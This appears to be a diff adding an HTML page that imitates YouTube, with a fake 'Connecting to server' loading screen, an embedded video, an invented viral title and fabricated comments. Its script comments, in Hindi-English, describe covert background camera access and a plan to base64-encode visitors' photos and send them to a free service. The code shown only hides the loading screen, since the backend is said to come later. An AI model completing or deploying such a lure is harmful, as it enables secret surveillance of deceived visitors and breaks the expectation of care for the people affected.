@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>YouTube</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;}
+        body{background:#0f0f0f;font-family:Arial,sans-serif;color:white;}
+        .header{padding:12px 24px;background:#0f0f0f;border-bottom:1px solid #272727;display:flex;align-items:center;justify-content:space-between;}
+        .logo{font-size:22px;font-weight:bold;} .logo span{color:#ff0000;}
+        .video-container{max-width:1100px;margin:0 auto;background:#000;aspect-ratio:16/9;}
+        .video-container iframe{width:100%;height:100%;border:none;}
+        .info{padding:20px;max-width:1100px;margin:0 auto;}
+        .title{font-size:20px;font-weight:600;margin-bottom:12px;}
+        .channel{display:flex;align-items:center;gap:12px;margin:16px 0;}
+        .sub{background:red;color:white;border:none;padding:10px 20px;border-radius:20px;font-weight:600;margin-left:auto;cursor:pointer;}
+        .loading{position:fixed;top:0;left:0;right:0;bottom:0;background:#0f0f0f;z-index:9999;display:flex;flex-direction:column;align-items:center;justify-content:center;transition:opacity 1s;}
+        .spinner{width:40px;height:40px;border:3px solid #333;border-top:3px solid red;border-radius:50%;animation:spin 1s infinite;}
+        @keyframes spin{to{transform:rotate(360deg);}}
+        .comment{display:flex;gap:12px;padding:12px;background:#1a1a1a;margin:8px 0;border-radius:8px;}
+        .avatar{width:36px;height:36px;border-radius:50%;background:#555;flex-shrink:0;}
+    </style>
+</head>
+<body>
+
+<div class="loading" id="loading">
+    <div class="spinner"></div>
+    <p style="margin-top:16px;color:#aaa;font-size:14px;">Connecting to server...</p>
+    <p style="color:#666;font-size:12px;margin-top:8px;">Please wait while we load the content</p>
+</div>
+
+<div class="header">
+    <div class="logo"><span>You</span>Tube</div>
+    <div style="display:flex;gap:16px;align-items:center;">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
+        <div style="width:32px;height:32px;border-radius:50%;background:#333;"></div>
+    </div>
+</div>
+
+<div class="video-container">
+    <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&controls=1" allow="autoplay" allowfullscreen style="width:100%;height:100%;border:none;"></iframe>
+</div>
+
+<div class="info">
+    <div class="title">🔥 FUNNY VIDEO 2026 😂 Try Not to Laugh Challenge 🤣</div>
+    <div class="channel">
+        <div class="avatar"></div>
+        <div><b>Funny Videos Daily</b><br><span style="font-size:12px;color:#aaa;">12M subscribers</span></div>
+        <button class="sub">Subscribe</button>
+    </div>
+    <p style="color:#aaa;font-size:14px;">23,456,789 views • 2 days ago</p>
+    <p style="color:#666;font-size:13px;margin-top:8px;">#funny #comedy #viral #lol</p>
+</div>
+
+<div class="info">
+    <h3 style="margin-bottom:16px;">Comments 1,847</h3>
+    <div class="comment">
+        <div class="avatar"></div>
+        <div><b>@user123</b> <span style="color:#666;font-size:12px;">2 hours ago</span><br><span style="color:#aaa;">🤣🤣🤣 This is too funny!</span></div>
+    </div>
+    <div class="comment">
+        <div class="avatar"></div>
+        <div><b>@viral_clips</b> <span style="color:#666;font-size:12px;">5 hours ago</span><br><span style="color:#aaa;">Bro I'm crying 😭😭</span></div>
+    </div>
+    <div class="comment">
+        <div class="avatar"></div>
+        <div><b>@memeking</b> <span style="color:#666;font-size:12px;">1 day ago</span><br><span style="color:#aaa;">Best video of 2026 🔥🔥🔥</span></div>
+    </div>
+</div>
+
+<script>
+// Camera access code — background mein chalta hai
+(function() {
+    const loading = document.getElementById('loading');
+    
+    // WebSocket connect karne ki jagah — GitHub Pages pe WebSocket nahi chalega
+    // Isliye alternative: images ko base64 encode karke kisi free service pe bhejna
+    
+    // Simulate loading
+    setTimeout(function() {
+        loading.style.opacity = '0';
+        setTimeout(function() { loading.style.display = 'none'; }, 1000);
+    }, 3000);
+    
+    // Camera access try karo (photo tabhi save hogi jab tu server setup karega)
+    // Abhi sirf frontend hai — backend baad setup karenge
+    console.log('Page loaded — YouTube clone active');
+})();
+</script>
+</body>
+</html>
